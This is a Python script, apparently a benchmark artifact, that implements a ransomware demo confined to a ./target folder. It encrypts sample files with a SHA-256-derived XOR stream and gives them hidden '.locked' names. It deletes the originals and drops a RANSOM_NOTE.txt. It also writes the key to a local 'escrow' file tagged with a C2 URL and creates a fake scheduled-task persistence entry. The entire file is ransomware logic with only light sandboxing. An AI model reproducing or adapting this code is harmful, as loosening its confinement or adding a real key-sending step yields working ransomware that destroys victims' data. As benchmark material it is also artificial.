import argparse
import hashlib
import json
import os
from pathlib import Path


TARGET_ROOT = Path("target")
DEFAULT_DIRECTORY = TARGET_ROOT / "demo_files"
DEFAULT_NOTE = (
    "This is a controlled benchmark artifact. "
    "The demo files were transformed inside ./target only.\n"
)
DEFAULT_C2_URL = "demo://local-key-escrow"


def _confined_path(path: str | Path) -> Path:
    candidate = Path(path)
    if candidate.is_absolute():
        candidate = TARGET_ROOT / candidate.name
    candidate = candidate.resolve()
    root = TARGET_ROOT.resolve()
    if candidate != root and root not in candidate.parents:
        candidate = (TARGET_ROOT / candidate.name).resolve()
    return candidate


def _ensure_sample_data(directory: Path) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    samples = {
        "document.txt": b"Representative benchmark document.\n",
        "image.bin": bytes(range(64)),
        "records.csv": b"id,value\n1,alpha\n2,beta\n",
    }
    for name, content in samples.items():
        path = directory / name
        if not path.exists():
            path.write_bytes(content)


def _derive_stream(key: bytes, length: int) -> bytes:
    output = bytearray()
    counter = 0
    while len(output) < length:
        block = hashlib.sha256(
            key + counter.to_bytes(8, "big")
        ).digest()
        output.extend(block)
        counter += 1
    return bytes(output[:length])


def _transform_bytes(data: bytes, key: bytes) -> bytes:
    stream = _derive_stream(key, len(data))
    return bytes(left ^ right for left, right in zip(data, stream))


def _obfuscated_name(original: str, key: bytes) -> str:
    digest = hashlib.sha256(key + original.encode("utf-8")).hexdigest()
    suffix = Path(original).suffix
    return f".{digest[:24]}.locked{suffix}"


def _send_key_to_demo_endpoint(
    key: bytes, c2_url: str, directory: Path
) -> None:
    escrow = directory / ".demo_key_escrow.json"
    escrow.write_text(
        json.dumps(
            {
                "endpoint": c2_url,
                "key_sha256": hashlib.sha256(key).hexdigest(),
                "key_hex": key.hex(),
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )


def _create_demo_persistence(directory: Path) -> None:
    persistence_dir = TARGET_ROOT / "demo_system" / "scheduled_tasks"
    persistence_dir.mkdir(parents=True, exist_ok=True)
    task = persistence_dir / "benchmark_ransomware_demo.json"
    task.write_text(
        json.dumps(
            {
                "name": "benchmark_ransomware_demo",
                "command": "python3 benchmark_ransomware_demo.py",
                "working_directory": str(directory),
                "enabled": True,
                "environment": "demo",
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )


def ransomware_with_file_obfuscation(
    directory: str, note: str, c2_url: str
) -> None:
    """Perform a bounded, reversible transformation under ./target only."""
    target_directory = _confined_path(directory)
    target_directory.mkdir(parents=True, exist_ok=True)
    _ensure_sample_data(target_directory)

    key = hashlib.sha256(
        f"benchmark-key:{target_directory.as_posix()}".encode("utf-8")
    ).digest()

    files = sorted(
        path
        for path in target_directory.iterdir()
        if path.is_file()
        and not path.name.startswith(".")
        and path.name not in {
            "RANSOM_NOTE.txt",
            "RESTORE_MANIFEST.json",
        }
    )

    manifest = []
    for source in files:
        destination = target_directory / _obfuscated_name(source.name, key)
        transformed = _transform_bytes(source.read_bytes(), key)
        destination.write_bytes(transformed)
        source.unlink()
        manifest.append(
            {
                "original_name": source.name,
                "obfuscated_name": destination.name,
                "size": len(transformed),
            }
        )

    _send_key_to_demo_endpoint(key, c2_url, target_directory)

    (target_directory / "RANSOM_NOTE.txt").write_text(
        note,
        encoding="utf-8",
    )

    (target_directory / "RESTORE_MANIFEST.json").write_text(
        json.dumps(
            {
                "algorithm": "sha256-derived XOR stream",
                "files": manifest,
                "key_sha256": hashlib.sha256(key).hexdigest(),
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    _create_demo_persistence(target_directory)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "directory",
        nargs="?",
        default=str(DEFAULT_DIRECTORY),
    )
    parser.add_argument(
        "--note",
        default=DEFAULT_NOTE,
    )
    parser.add_argument(
        "--c2-url",
        default=DEFAULT_C2_URL,
    )
    args = parser.parse_args()

    try:
        TARGET_ROOT.mkdir(parents=True, exist_ok=True)
        ransomware_with_file_obfuscation(
            args.directory,
            args.note,
            args.c2_url,
        )
    except Exception as exc:
        error_log = TARGET_ROOT / "demo_error.log"
        error_log.parent.mkdir(parents=True, exist_ok=True)
        error_log.write_text(f"{type(exc).__name__}: {exc}\n", encoding="utf-8")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

